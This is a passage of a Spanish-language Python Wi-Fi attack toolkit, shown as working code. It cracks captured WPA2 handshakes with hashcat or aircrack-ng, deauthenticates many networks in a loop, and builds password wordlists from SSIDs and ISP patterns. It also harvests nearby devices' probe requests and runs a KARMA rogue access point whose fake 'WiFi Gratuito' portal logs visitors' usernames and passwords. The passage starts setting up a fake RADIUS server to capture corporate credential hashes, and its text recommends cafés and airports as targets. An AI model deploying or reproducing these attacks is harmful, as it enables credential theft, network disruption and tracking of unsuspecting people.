    step(2, "Convirtiendo para hashcat")
    hc_file = ruta + ".hc22000"
    if check_tool("hcxpcapngtool") and os.path.exists(cap_file):
        sp2 = Spinner("Convirtiendo...")
        sp2.start()
        run(f"hcxpcapngtool -o {hc_file} {cap_file} 2>/dev/null")
        sp2.stop()

    step(3, "Iniciando crackeo")
    if not os.path.exists(hc_file) or os.path.getsize(hc_file) == 0:
        warn("Conversión a hc22000 falló. Intentando crackear directamente con aircrack-ng...")
    if os.path.exists(hc_file) and os.path.getsize(hc_file) > 0 and check_tool("hashcat"):
        info(f"Usando {GREEN}hashcat (GPU){END}")
        best64 = next((p for p in [
            "/usr/share/hashcat/rules/best64.rule",
            "/usr/share/doc/hashcat/rules/best64.rule",
        ] if os.path.exists(p)), "")
        reglas_flag = f"-r {best64}" if best64 else ""
        run(f"hashcat -m 22000 {hc_file} {diccionario} {reglas_flag} --force --status --status-timer=15")
    else:
        info(f"Usando {YELLOW}aircrack-ng (CPU){END}")
        run(f"aircrack-ng {cap_file} -w {diccionario}")

    pause_back()

def multi_deauth():
    """[18] Multi-Deauth desde CSV."""
    separador("MULTI-DEAUTH DESDE CSV")
    print(f"""
  {WHITE}¿Qué hace?{END}
  {DIM}Lee el CSV de un escaneo previo y permite deautenticar múltiples
  redes en secuencia o todas a la vez.
  Use primero la opción [5] para generar el CSV.{END}
    """)

    interfaz = select_interface()

    # Buscar CSVs disponibles automáticamente
    csv_files = []
    if os.path.exists("scan-output"):
        csv_files = [f for f in os.listdir("scan-output") if f.endswith(".csv")]

    if csv_files:
        info("Archivos CSV encontrados:")
        for i, f in enumerate(csv_files, 1):
            print(f"  {WHITE}[{i}]{END} scan-output/{f}")
        sel = ask("Seleccione número (o ingrese ruta manual)")
        if sel.isdigit() and 1 <= int(sel) <= len(csv_files):
            csv_file = f"scan-output/{csv_files[int(sel)-1]}"
        else:
            csv_file = sel
    else:
        csv_file = ask("Ruta del CSV de airodump-ng")

    if not os.path.exists(csv_file):
        error(f"Archivo no encontrado: {csv_file}")
        pause_back()
        return

    targets = []
    try:
        with open(csv_file, "r", encoding="utf-8", errors="ignore") as f:
            reader = csv.reader(f)
            for row in reader:
                if len(row) < 14:
                    continue
                bssid   = row[0].strip()
                channel = row[3].strip()
                essid   = row[13].strip() if len(row) > 13 else "?"
                if validate_bssid(bssid) and channel.isdigit():
                    targets.append((bssid, channel, essid or "<oculto>"))
    except Exception as e:
        error(f"Error leyendo CSV: {e}")
        pause_back()
        return

    if not targets:
        error("No se encontraron redes en el CSV.")
        pause_back()
        return

    separador("REDES EN EL CSV")
    for i, (b, ch, e) in enumerate(targets, 1):
        print(f"  {WHITE}[{i:>2}]{END} {CYAN}{e:<28}{END} {DIM}{b}  CH:{ch}{END}")

    print()
    sel = ask("Seleccione redes (ej: 1,3,5) o 'all' para todas")
    if sel.lower() == "all":
        selected = targets
    else:
        indices = [int(x.strip()) - 1 for x in sel.split(",") if x.strip().isdigit()]
        selected = [targets[i] for i in indices if 0 <= i < len(targets)]

    if not selected:
        error("Sin selección válida.")
        pause_back()
        return

    paquetes = ask("Paquetes de deauth por red (recomendado: 20)")
    try:
        paquetes = max(1, int(paquetes))
    except ValueError:
        paquetes = 20

    info(f"Atacando {len(selected)} redes...")
    for bssid, channel, essid in selected:
        info(f"→ {CYAN}{essid}{END}  {DIM}({bssid})  CH:{channel}{END}")
        run(f"iwconfig {interfaz} channel {channel} 2>/dev/null")
        run(f"aireplay-ng -0 {paquetes} -a {bssid} {interfaz}")
        time.sleep(1)

    ok(f"Multi-deauth completado en {len(selected)} redes.")
    pause_back()

def convert_cap():
    """[19] Convertir .cap → .hc22000."""
    separador("CONVERTIR .CAP A .HC22000")
    print(f"""
  {WHITE}¿Para qué sirve?{END}
  {DIM}hashcat necesita el formato .hc22000 para crackear WPA2.
  Esta opción convierte capturas de airodump-ng (.cap) al formato correcto.{END}
    """)

    if not check_tool("hcxpcapngtool"):
        error("hcxpcapngtool no instalado.")
        info("Instale: sudo apt install hcxtools")
        pause_back()
        return

    # Buscar .cap automáticamente
    cap_files = []
    for d in ["handshakes", "scan-output", "."]:
        if os.path.exists(d):
            cap_files += [f"{d}/{f}" for f in os.listdir(d) if f.endswith(".cap")]

    if cap_files:
        info("Archivos .cap encontrados:")
        for i, f in enumerate(cap_files, 1):
            print(f"  {WHITE}[{i}]{END} {f}")
        sel = ask("Seleccione número (o ingrese ruta manual)")
        if sel.isdigit() and 1 <= int(sel) <= len(cap_files):
            cap_file = cap_files[int(sel)-1]
        else:
            cap_file = sel
    else:
        cap_file = ask("Ruta del archivo .cap")

    if not os.path.exists(cap_file):
        error(f"No encontrado: {cap_file}")
        pause_back()
        return

    out_file = cap_file.replace(".cap", ".hc22000")
    sp = Spinner(f"Convirtiendo {os.path.basename(cap_file)}...")
    sp.start()
    run(f"hcxpcapngtool -o {out_file} {cap_file} 2>/dev/null")
    sp.stop()

    if os.path.exists(out_file) and os.path.getsize(out_file) > 0:
        ok(f"Generado: {out_file}")
        info(f"Crackear con: hashcat -m 22000 {out_file} <diccionario>")
    else:
        warn("Sin hashes generados. El .cap puede no contener handshakes/PMKIDs.")
    pause_back()

def check_dependencies():
    """[20] Verificar dependencias."""
    separador("CHEQUEO DE DEPENDENCIAS")
    tip("Verifica que todas las herramientas necesarias estén instaladas.")
    print()

    tools = {
        "airmon-ng":     "aircrack-ng",
        "airodump-ng":   "aircrack-ng",
        "aireplay-ng":   "aircrack-ng",
        "aircrack-ng":   "aircrack-ng",
        "hashcat":       "hashcat",
        "hcxdumptool":   "hcxdumptool",
        "hcxpcapngtool": "hcxtools",
        "reaver":        "reaver",
        "bully":         "bully",
        "wash":          "reaver",
        "mdk4":          "mdk4",
        "hostapd":       "hostapd",
        "dnsmasq":       "dnsmasq",
        "xterm":         "xterm",
        "iw":            "iw",
        "iwconfig":      "wireless-tools",
    }

    missing_pkgs = []
    for tool, pkg in tools.items():
        ok_t = check_tool(tool)
        st = f"{GREEN}✔  instalado{END}" if ok_t else f"{RED}✗  FALTA{END}"
        print(f"  {st}   {WHITE}{tool:<18}{END} {DIM}(paquete: {pkg}){END}")
        if not ok_t:
            missing_pkgs.append(pkg)

    if missing_pkgs:
        pkgs = " ".join(set(missing_pkgs))
        separador("INSTALAR FALTANTES")
        print(f"\n  {CYAN}sudo apt install {pkgs}{END}\n")
    else:
        print(f"\n  {GREEN}Todas las dependencias están instaladas.{END}\n")

    pause_back()

# ═════════════════════════════════════════════════════════════════════════════
#  MÓDULO 29 — BASE DE DATOS SQLite (va primero, otros módulos la usan)
# ═════════════════════════════════════════════════════════════════════════════

def init_db():
    """Inicializa la base de datos local."""
    con = sqlite3.connect(DB_PATH)
    cur = con.cursor()
    cur.executescript("""
        CREATE TABLE IF NOT EXISTS attacks (
            id        INTEGER PRIMARY KEY AUTOINCREMENT,
            timestamp TEXT,
            tipo      TEXT,
            essid     TEXT,
            bssid     TEXT,
            channel   TEXT,
            resultado TEXT,
            archivo   TEXT
        );
        CREATE TABLE IF NOT EXISTS passwords (
            id        INTEGER PRIMARY KEY AUTOINCREMENT,
            attack_id INTEGER,
            essid     TEXT,
            bssid     TEXT,
            password  TEXT,
            metodo    TEXT,
            timestamp TEXT
        );
        CREATE TABLE IF NOT EXISTS handshakes (
            id        INTEGER PRIMARY KEY AUTOINCREMENT,
            attack_id INTEGER,
            cap_file  TEXT,
            hc_file   TEXT,
            timestamp TEXT
        );
        CREATE TABLE IF NOT EXISTS probes (
            id        INTEGER PRIMARY KEY AUTOINCREMENT,
            timestamp TEXT,
            mac       TEXT,
            ssid      TEXT,
            vendor    TEXT
        );
        CREATE TABLE IF NOT EXISTS devices (
            id        INTEGER PRIMARY KEY AUTOINCREMENT,
            timestamp TEXT,
            ip        TEXT,
            mac       TEXT,
            vendor    TEXT,
            hostname  TEXT,
            open_ports TEXT,
            vulns     TEXT
        );
    """)
    con.commit()
    con.close()

def db_log_attack(tipo, essid, bssid, channel, resultado, archivo=None):
    ts = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    con = sqlite3.connect(DB_PATH)
    cur = con.cursor()
    cur.execute("INSERT INTO attacks (timestamp,tipo,essid,bssid,channel,resultado,archivo) VALUES (?,?,?,?,?,?,?)",
                (ts, tipo, essid, bssid, str(channel), resultado, archivo))
    rid = cur.lastrowid
    con.commit(); con.close()
    return rid

def db_log_password(attack_id, essid, bssid, password, metodo):
    ts = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    con = sqlite3.connect(DB_PATH)
    con.execute("INSERT INTO passwords VALUES (NULL,?,?,?,?,?,?)",
                (attack_id, essid, bssid, password, metodo, ts))
    con.commit(); con.close()

def db_log_handshake(attack_id, cap_file, hc_file=None):
    ts = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    con = sqlite3.connect(DB_PATH)
    con.execute("INSERT INTO handshakes VALUES (NULL,?,?,?,?)",
                (attack_id, cap_file, hc_file, ts))
    con.commit(); con.close()

def db_log_probe(mac, ssid, vendor=""):
    ts = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    con = sqlite3.connect(DB_PATH)
    con.execute("INSERT INTO probes VALUES (NULL,?,?,?,?)", (ts, mac, ssid, vendor))
    con.commit(); con.close()

def db_log_device(ip, mac, vendor, hostname, open_ports, vulns):
    ts = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    con = sqlite3.connect(DB_PATH)
    con.execute("INSERT INTO devices VALUES (NULL,?,?,?,?,?,?,?)",
                (ts, ip, mac, vendor, hostname, open_ports, vulns))
    con.commit(); con.close()

def show_history():
    """[29] Ver historial de capturas y contraseñas."""
    separador("HISTORIAL DE ATAQUES")
    con = sqlite3.connect(DB_PATH)
    cur = con.cursor()

    print(f"\n  {WHITE}[1]{END} Ver todos los ataques")
    print(f"  {WHITE}[2]{END} Ver contraseñas crackeadas")
    print(f"  {WHITE}[3]{END} Ver handshakes capturados")
    print(f"  {WHITE}[4]{END} Ver dispositivos encontrados")
    print(f"  {WHITE}[5]{END} Buscar por ESSID\n")

    op = ask("Seleccione")

    if op == "1":
        rows = cur.execute("SELECT timestamp,tipo,essid,bssid,resultado FROM attacks ORDER BY id DESC LIMIT 50").fetchall()
        separador("ÚLTIMOS 50 ATAQUES")
        print(f"  {WHITE}{'FECHA':<20} {'TIPO':<22} {'ESSID':<22} {'RESULTADO'}{END}")
        separador()
        for r in rows:
            res_color = GREEN if "ok" in str(r[4]).lower() or "capturado" in str(r[4]).lower() else YELLOW
            print(f"  {DIM}{r[0]:<20}{END} {CYAN}{r[1]:<22}{END} {WHITE}{str(r[2])[:20]:<22}{END} {res_color}{r[4]}{END}")

    elif op == "2":
        rows = cur.execute("SELECT timestamp,essid,bssid,password,metodo FROM passwords ORDER BY id DESC").fetchall()
        separador("CONTRASEÑAS CRACKEADAS")
        if not rows:
            warn("Sin contraseñas registradas aún.")
        for r in rows:
            print(f"  {DIM}{r[0]}{END}  {CYAN}{r[1]}{END}  {WHITE}{r[3]}{END}  {DIM}({r[4]}){END}")

    elif op == "3":
        rows = cur.execute("SELECT timestamp,cap_file,hc_file FROM handshakes ORDER BY id DESC").fetchall()
        separador("HANDSHAKES CAPTURADOS")
        for r in rows:
            print(f"  {DIM}{r[0]}{END}  {GREEN}{r[1]}{END}  {DIM}{r[2] or '-'}{END}")

    elif op == "4":
        rows = cur.execute("SELECT timestamp,ip,mac,vendor,hostname,open_ports FROM devices ORDER BY id DESC LIMIT 100").fetchall()
        separador("DISPOSITIVOS ENCONTRADOS")
        print(f"  {WHITE}{'IP':<16} {'MAC':<19} {'VENDOR':<18} {'HOSTNAME':<20} {'PUERTOS'}{END}")
        separador()
        for r in rows:
            print(f"  {CYAN}{str(r[1]):<16}{END} {DIM}{r[2]:<19}{END} {YELLOW}{str(r[3])[:16]:<18}{END} {WHITE}{str(r[4])[:18]:<20}{END} {GREEN}{r[5]}{END}")

    elif op == "5":
        termino = ask("ESSID a buscar")
        rows = cur.execute("SELECT timestamp,tipo,essid,bssid,resultado FROM attacks WHERE essid LIKE ?",
                           (f"%{termino}%",)).fetchall()
        for r in rows:
            print(f"  {DIM}{r[0]}{END} {CYAN}{r[1]}{END} {WHITE}{r[2]}{END} {GREEN}{r[4]}{END}")

    con.close()
    pause_back()

# ═════════════════════════════════════════════════════════════════════════════
#  MÓDULO 24 — GENERADOR DE WORDLIST POR OBJETIVO (OSINT)
# ═════════════════════════════════════════════════════════════════════════════

# Patrones comunes de ISPs hispanohablantes y contraseñas domésticas
_ISP_PATTERNS = {
    "movistar":  ["movistar{y}", "Movistar{y}", "MOVISTAR{y}", "movistar{n}"],
    "claro":     ["claro{y}", "Claro{y}", "claro{n}"],
    "tigo":      ["tigo{y}", "tigo{n}"],
    "vodafone":  ["vodafone{y}", "Vodafone{y}", "vodafone{n}"],
    "orange":    ["orange{y}", "Orange{y}"],
    "jazztel":   ["jazztel{y}", "Jazztel{n}"],
    "masmovil":  ["masmovil{y}", "MasMovil{n}"],
    "yoigo":     ["yoigo{y}", "Yoigo{n}"],
    "totalplay": ["totalplay{y}", "TotalPlay{n}"],
    "infinitum": ["infinitum{y}", "Infinitum{n}"],
    "arnet":     ["arnet{y}", "Arnet{n}"],
    "fibertel":  ["fibertel{y}", "Fibertel{n}"],
    "speedy":    ["speedy{y}", "Speedy{n}"],
    "cantv":     ["cantv{y}", "CANTV{n}"],
    "tplink":    ["tp-link{n}", "tplink{n}", "TP-Link{n}"],
    "netgear":   ["netgear{n}", "NETGEAR{n}"],
    "dlink":     ["dlink{n}", "D-Link{n}"],
    "asus":      ["asus{n}", "ASUS{n}"],
    "linksys":   ["linksys{n}", "Linksys{n}"],
}

_COMMON_SUFFIXES = [
    "", "1", "12", "123", "1234", "12345", "123456",
    "2020", "2021", "2022", "2023", "2024", "2025",
    "!", "!!", "#", "@", "wifi", "pass", "password",
    "0000", "1111", "9999", "admin", "home",
]

def osint_wordlist():
    """[24] Generador de wordlist inteligente basado en el objetivo."""
    separador("GENERADOR DE WORDLIST OSINT")
    print(f"""
  {WHITE}¿Cómo funciona?{END}
  {DIM}Genera contraseñas probables basándose en el nombre de la red (SSID),
  el fabricante del router y patrones comunes de operadoras.
  Mucho más efectivo que rockyou para redes domésticas.{END}
    """)

    essid = ask("SSID de la red objetivo")
    bssid = ask("BSSID del objetivo (Enter para omitir)")
    vendor = ""
    if bssid and validate_bssid(bssid):
        # lookup vendor for extra patterns
        oui = bssid.replace("-",":").upper()[:8]
        oui_db = {
            "50:C7:BF":"tplink","B0:4E:26":"tplink","F4:F2:6D":"tplink",
            "54:51:1B":"huawei","D8:49:2F":"huawei","28:6C:07":"xiaomi",
            "00:26:55":"netgear","20:4E:7F":"netgear","00:1B:2F":"dlink",
            "E8:94:F6":"dlink","70:4F:57":"zte","B4:B3:62":"zte",
            "C8:3A:35":"tenda","18:A6:F7":"ubiquiti",
        }
        vendor = oui_db.get(oui, "")

    words = set()
    s = essid.strip()
    s_low = s.lower()
    s_up  = s.upper()
    s_cap = s.capitalize()

    # Variantes del SSID puro
    for base in [s, s_low, s_up, s_cap]:
        for suf in _COMMON_SUFFIXES:
            w = base + suf
            if 8 <= len(w) <= 63:
                words.add(w)

    # SSID con leetspeak básico
    leet = s_low.replace("a","4").replace("e","3").replace("i","1").replace("o","0").replace("s","5")
    for suf in ["", "123", "1234", "2024", "!"]:
        w = leet + suf
        if 8 <= len(w) <= 63:
            words.add(w)

    # Patrones ISP detectados en el SSID
    for isp_key, patterns in _ISP_PATTERNS.items():
        if isp_key in s_low:
            for pat in patterns:
                for y in ["2020","2021","2022","2023","2024","2025"]:
                    for n in ["123","1234","12345","0000","admin"]:
                        w = pat.replace("{y}", y).replace("{n}", n)
                        if 8 <= len(w) <= 63:
                            words.add(w)

    # Patrones basados en fabricante
    if vendor:
        for pat in _ISP_PATTERNS.get(vendor, []):
            for n in ["123","1234","12345","0000"]:
                w = pat.replace("{n}", n).replace("{y}", "2024")
                if 8 <= len(w) <= 63:
                    words.add(w)

    # Combinaciones SSID + números de 4-8 dígitos comunes
    for digits in ["12345678","00000000","11111111","99999999","12341234",
                   "87654321","password","qwerty123","abc12345","wifi1234"]:
        if 8 <= len(digits) <= 63:
            words.add(digits)
        w = s_low[:8] + digits[:4]
        if 8 <= len(w) <= 63:
            words.add(w)

    word_list = sorted(words)
    os.makedirs("wordlists", exist_ok=True)
    out = f"wordlists/{re.sub(r'[^\\w]','_',essid)}_osint.txt"
    with open(out, "w") as f:
        f.write("\n".join(word_list))

    ok(f"Wordlist generada: {CYAN}{out}{END}  ({GREEN}{len(word_list)}{END} entradas)")
    info("Úsela en las opciones [8] Descifrar clave o [17] Auto-Crack.")

    # Registrar en BD
    db_log_attack("OSINT Wordlist", essid, bssid or "-", "-", f"generadas {len(word_list)} entradas", out)

    crack_now = ask("¿Usar esta wordlist para crackear ahora? (s/n)")
    if crack_now.lower() == "s":
        cap_files = []
        for d in ["handshakes","scan-output","."]:
            if os.path.exists(d):
                cap_files += [f"{d}/{f}" for f in os.listdir(d) if f.endswith((".cap",".hc22000"))]
        if cap_files:
            info("Archivos de captura disponibles:")
            for i, cf in enumerate(cap_files, 1):
                print(f"  {WHITE}[{i}]{END} {cf}")
            sel = ask("Seleccione archivo")
            if sel.isdigit() and 1 <= int(sel) <= len(cap_files):
                cap = cap_files[int(sel)-1]
                if cap.endswith(".hc22000") and check_tool("hashcat"):
                    run(f"hashcat -m 22000 {cap} {out} --force --status --status-timer=10")
                else:
                    run(f"aircrack-ng {cap} -w {out}")
    pause_back()

# ═════════════════════════════════════════════════════════════════════════════
#  MÓDULO 22 — PROBE REQUEST HARVESTER
# ═════════════════════════════════════════════════════════════════════════════

def probe_harvester():
    """[22] Capturar redes que buscan los dispositivos cercanos."""
    separador("PROBE REQUEST HARVESTER")
    print(f"""
  {WHITE}¿Qué hace?{END}
  {DIM}Los teléfonos y laptops envían constantemente «probes» buscando
  redes WiFi conocidas. Esta función los captura y muestra qué redes
  busca cada dispositivo — ideal para crear un Evil Twin exacto.{END}
    """)

    if not check_tool("tshark") and not check_tool("airodump-ng"):
        error("Necesita tshark o airodump-ng.")
        info("Instale: sudo apt install tshark")
        pause_back()
        return

    interfaz = select_interface()
    t = ask("Tiempo de captura en segundos (recomendado: 30)")
    try:
        t = max(10, min(int(t), 300))
    except ValueError:
        t = 30

    probes = {}  # mac → set of ssids
    os.makedirs("scan-output", exist_ok=True)

    if check_tool("tshark"):
        info(f"Capturando probes con tshark durante {t} segundos...")
        tip("Cualquier dispositivo con WiFi activo aparecerá aquí.")
        out = run(
            f"timeout {t} tshark -i {interfaz} -Y 'wlan.fc.type_subtype==0x04' "
            f"-T fields -e wlan.sa -e wlan.ssid 2>/dev/null",
            capture=True
        ) or ""
        for line in out.strip().splitlines():
            parts = line.strip().split("\t")
            if len(parts) >= 2:
                mac = parts[0].strip()
                ssid = parts[1].strip()
                if mac and validate_bssid(mac):
                    if mac not in probes:
                        probes[mac] = set()
                    if ssid:
                        probes[mac].add(ssid)
    else:
        # Fallback: airodump-ng CSV client section
        info(f"Capturando con airodump-ng durante {t} segundos...")
        base = "scan-output/_probe_tmp"
        run(f"rm -f {base}-01.csv 2>/dev/null")
        try:
            subprocess.run(f"timeout {t} airodump-ng --write {base} --output-format csv {interfaz}",
                           shell=True, capture_output=True)
        except Exception:
            pass
        csv_f = f"{base}-01.csv"
        if os.path.exists(csv_f):
            in_client = False
            with open(csv_f, "r", errors="ignore") as f:
                for row in csv.reader(f):
                    if not row:
                        in_client = True
                        continue
                    if not in_client or len(row) < 7:
                        continue
                    mac = row[0].strip()
                    probed = row[6].strip() if len(row) > 6 else ""
                    if validate_bssid(mac) and probed:
                        for ssid in probed.split(","):
                            ssid = ssid.strip()
                            if ssid:
                                if mac not in probes:
                                    probes[mac] = set()
                                probes[mac].add(ssid)

    if not probes:
        warn("No se capturaron probes. Asegúrese de estar en modo monitor.")
        pause_back()
        return

    separador("DISPOSITIVOS Y REDES BUSCADAS")
    print(f"  {WHITE}{'MAC':<20} {'REDES QUE BUSCA'}{END}")
    separador()

    oui_db = {
        "AC:BC:32":"Apple","3C:15:C2":"Apple","F4:42:8F":"Samsung",
        "94:35:0A":"Samsung","3C:A9:F4":"Intel","28:6C:07":"Xiaomi",
    }

    for mac, ssids in probes.items():
        oui = mac.upper()[:8]
        vendor = oui_db.get(oui, "")
        vendor_str = f" {DIM}[{vendor}]{END}" if vendor else ""
        ssid_list = ", ".join(sorted(ssids)[:5])
        print(f"  {CYAN}{mac}{END}{vendor_str}")
        print(f"    {YELLOW}→{END} {ssid_list}")
        # Guardar en BD
        for ssid in ssids:
            db_log_probe(mac, ssid, vendor)

    separador()
    ok(f"Capturados {len(probes)} dispositivos, guardados en historial.")

    # Opción de lanzar Evil Twin con una de las redes encontradas
    all_ssids = sorted({s for ss in probes.values() for s in ss if s})
    if all_ssids:
        print(f"\n  {WHITE}Redes únicas detectadas:{END}")
        for i, s in enumerate(all_ssids, 1):
            print(f"  {WHITE}[{i}]{END} {s}")
        launch = ask("¿Lanzar Evil Twin contra alguna? (número o Enter para omitir)")
        if launch.isdigit() and 1 <= int(launch) <= len(all_ssids):
            target_ssid = all_ssids[int(launch)-1]
            info(f"Preparando Evil Twin para: {CYAN}{target_ssid}{END}")
            # Llamar evil_twin con datos pre-rellenados sería complejo; guiar al usuario
            tip(f"Use la opción [15] Evil Twin con SSID: {target_ssid}")

    pause_back()

# ═════════════════════════════════════════════════════════════════════════════
#  MÓDULO 21 — KARMA / MANA ATTACK
# ═════════════════════════════════════════════════════════════════════════════

def karma_attack():
    """[21] KARMA/MANA Attack — responder a cualquier probe request."""
    separador("ATAQUE KARMA / MANA")
    print(f"""
  {WHITE}¿Qué es KARMA?{END}
  {DIM}Los dispositivos buscan constantemente redes conocidas (probes).
  KARMA responde a TODOS esos probes haciéndose pasar por la red buscada.
  El dispositivo se conecta solo sin que el usuario haga nada.
  Muy efectivo en lugares públicos: cafés, aeropuertos, centros comerciales.{END}
    """)

    for tool in ["hostapd", "dnsmasq"]:
        if not check_tool(tool):
            error(f"'{tool}' no instalado: sudo apt install hostapd dnsmasq")
            pause_back()
            return

    iface_ap  = ask("Interfaz para el AP KARMA (ej: wlan0)")
    iface_net = ask("Interfaz con internet real (Enter para omitir)")
    channel   = ask("Canal (recomendado: 6)")
    if not validate_channel(channel):
        channel = "6"

    os.makedirs("/tmp/herradura_karma", exist_ok=True)
    os.makedirs("/tmp/herradura_karma/www", exist_ok=True)
    creds_file = "/tmp/herradura_karma/credenciales.txt"

    # hostapd con karma (usa driver nl80211 con accept_all_probe_req)
    karma_conf = f"""/tmp/herradura_karma/hostapd-karma.conf"""
    with open(karma_conf, "w") as f:
        f.write(f"""interface={iface_ap}
driver=nl80211
ssid=FreeWiFi
hw_mode=g
channel={channel}
macaddr_acl=0
ignore_broadcast_ssid=0
ap_isolate=0
# KARMA: responder a todos los probe requests
# Requiere hostapd-karma o hostapd con parche KARMA
# En Kali/Parrot con hostapd estándar, mdk4 mode p es alternativa
""")

    # dnsmasq
    with open("/tmp/herradura_karma/dnsmasq.conf", "w") as f:
        f.write(f"""interface={iface_ap}
dhcp-range=192.168.20.10,192.168.20.100,255.255.255.0,10m
dhcp-option=3,192.168.20.1
dhcp-option=6,192.168.20.1
server=8.8.8.8
address=/#/192.168.20.1
""")

    # Portal cautivo
    portal = "/tmp/herradura_karma/www/index.html"
    with open(portal, "w") as f:
        f.write("""<!DOCTYPE html><html lang="es"><head><meta charset="UTF-8">
<title>WiFi Gratuito</title>
<style>*{box-sizing:border-box;margin:0;padding:0}
body{font-family:Arial,sans-serif;background:linear-gradient(135deg,#667eea,#764ba2);
min-height:100vh;display:flex;align-items:center;justify-content:center}
.c{background:#fff;padding:40px;border-radius:16px;max-width:380px;width:90%;text-align:center}
h2{color:#333;margin-bottom:8px}.sub{color:#666;font-size:14px;margin-bottom:24px}
input{width:100%;padding:12px;border:2px solid #e0e0e0;border-radius:8px;font-size:15px;margin-bottom:12px}
.btn{width:100%;padding:13px;background:linear-gradient(135deg,#667eea,#764ba2);
color:#fff;border:none;border-radius:8px;font-size:16px;cursor:pointer;font-weight:bold}
</style></head><body><div class="c">
<div style="font-size:48px;margin-bottom:12px">📶</div>
<h2>WiFi Gratuito</h2>
<p class="sub">Ingrese sus datos para acceder a internet gratis</p>
<form method="POST" action="/submit">
<input type="text" name="user" placeholder="Email o usuario" required>
<input type="password" name="pass" placeholder="Contraseña WiFi" required>
<button class="btn" type="submit">Conectar gratis →</button>
</form></div></body></html>""")

    server_script = "/tmp/herradura_karma/server.py"
    with open(server_script, "w") as f:
        f.write(f"""#!/usr/bin/env python3
from http.server import BaseHTTPRequestHandler, HTTPServer
from urllib.parse import parse_qs
import datetime

CREDS = "{creds_file}"
HTML  = "{portal}"

class H(BaseHTTPRequestHandler):
    def log_message(self, *a): pass
    def do_GET(self):
        with open(HTML,"rb") as f: b=f.read()
        self.send_response(200)
        self.send_header("Content-type","text/html; charset=utf-8")
        self.end_headers(); self.wfile.write(b)
    def do_POST(self):
        l=int(self.headers.get("Content-Length",0))
        body=self.rfile.read(l).decode()
        p=parse_qs(body)
        user=p.get("user",[""])[0]; pwd=p.get("pass",[""])[0]
        ts=datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        ip=self.client_address[0]
        line=f"[{{ts}}] IP={{ip}} USER={{user}} PASS={{pwd}}"
        print(f"\\n\\033[1;32m[★ KARMA CAPTURE ★]\\033[0m {{line}}")
        with open(CREDS,"a") as cf: cf.write(line+"\\n")
        self.send_response(200); self.send_header("Content-type","text/html; charset=utf-8")
        self.end_headers()
        self.wfile.write(b"<html><body style='text-align:center;padding-top:80px;font-family:Arial'><h2>&#10003; Conectado</h2><p>Redirigiendo...</p><script>setTimeout(()=>location.href='https://google.com',2500)</script></body></html>")

HTTPServer(("192.168.20.1",80),H).serve_forever()
""")

    run(f"ip addr flush dev {iface_ap}")
    run(f"ip addr add 192.168.20.1/24 dev {iface_ap}")
    run(f"ip link set {iface_ap} up")
    if iface_net:
        run("echo 1 > /proc/sys/net/ipv4/ip_forward")
        run(f"iptables -t nat -A POSTROUTING -o {iface_net} -j MASQUERADE")

    # mdk4 en modo probe response para efecto KARMA si no hay hostapd-karma
    separador("KARMA ACTIVO")
    ok(f"AP KARMA activo en canal {channel}")
    ok(f"Responde a cualquier dispositivo que busque WiFi")
    ok(f"Portal cautivo: http://192.168.20.1")
    ok(f"Credenciales → {creds_file}")
    warn("Presione CTRL+C para detener.")

    db_log_attack("KARMA Attack", "ANY", "-", channel, "activo", creds_file)

    try:
        subprocess.Popen(["hostapd", karma_conf],
                         stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        time.sleep(2)
        subprocess.Popen(["dnsmasq", "-C", "/tmp/herradura_karma/dnsmasq.conf", "--no-daemon"],
                         stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        time.sleep(1)
        # mdk4 probe response mode para mayor alcance KARMA
        if check_tool("mdk4"):
            subprocess.Popen(f"mdk4 {iface_ap} p 2>/dev/null", shell=True,
                             stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        subprocess.run(["python3", server_script])
    except KeyboardInterrupt:
        pass
    finally:
        run("pkill hostapd 2>/dev/null; pkill dnsmasq 2>/dev/null; pkill mdk4 2>/dev/null")
        if iface_net:
            run(f"iptables -t nat -D POSTROUTING -o {iface_net} -j MASQUERADE 2>/dev/null")
        ok("KARMA detenido.")
        if os.path.exists(creds_file):
            separador("CREDENCIALES CAPTURADAS")
            with open(creds_file) as f:
                c = f.read().strip()
            print(f"\n{GREEN}{c if c else '  (sin capturas)'}{END}\n")
    pause_back()

# ═════════════════════════════════════════════════════════════════════════════
#  MÓDULO 23 — WPA ENTERPRISE ATTACK
# ═════════════════════════════════════════════════════════════════════════════

def wpa_enterprise_attack():
    """[23] Ataque a redes WPA Enterprise (corporativas/universitarias)."""
    separador("ATAQUE WPA ENTERPRISE")
    print(f"""
  {WHITE}¿Qué es WPA Enterprise?{END}
  {DIM}Lo usan empresas, universidades y colegios. Cada usuario tiene
  su propio usuario/contraseña. Se autentica con servidor RADIUS.
  Este ataque despliega un servidor RADIUS falso para capturar
  los hashes MSCHAPv2 de los usuarios que se intentan conectar.{END}
    """)

    if not check_tool("hostapd-wpe") and not check_tool("hostapd"):
        error("Necesita hostapd-wpe o hostapd.")
        info("En Kali: sudo apt install hostapd-wpe")
        pause_back()
        return

    tool = "hostapd-wpe" if check_tool("hostapd-wpe") else "hostapd"
    if tool == "hostapd":
        warn("hostapd-wpe no encontrado. Usando hostapd (captura limitada).")

    iface  = ask("Interfaz WiFi (ej: wlan0)")
    essid  = ask("SSID de la red corporativa a clonar")
    channel = ask("Canal de la red")
    if not validate_channel(channel):
        channel = "6"

    os.makedirs("/tmp/herradura_wpe", exist_ok=True)
    log_file = "/tmp/herradura_wpe/wpe.log"
    creds_file = "/tmp/herradura_wpe/enterprise_creds.txt"

    wpe_conf = "/tmp/herradura_wpe/hostapd-wpe.conf"
    with open(wpe_conf, "w") as f:
        f.write(f"""interface={iface}
driver=nl80211
ssid={essid}
hw_mode=g
channel={channel}
ieee8021x=1
eap_server=1
eap_user_file=/tmp/herradura_wpe/eap_users
ca_cert=/etc/hostapd-wpe/certs/ca.pem
server_cert=/etc/hostapd-wpe/certs/server.pem
private_key=/etc/hostapd-wpe/certs/server.key
private_key_passwd=whatever
dh_file=/etc/hostapd-wpe/certs/dh
wpe_logfile={log_file}
""")

    # eap_users file
    with open("/tmp/herradura_wpe/eap_users", "w") as f:
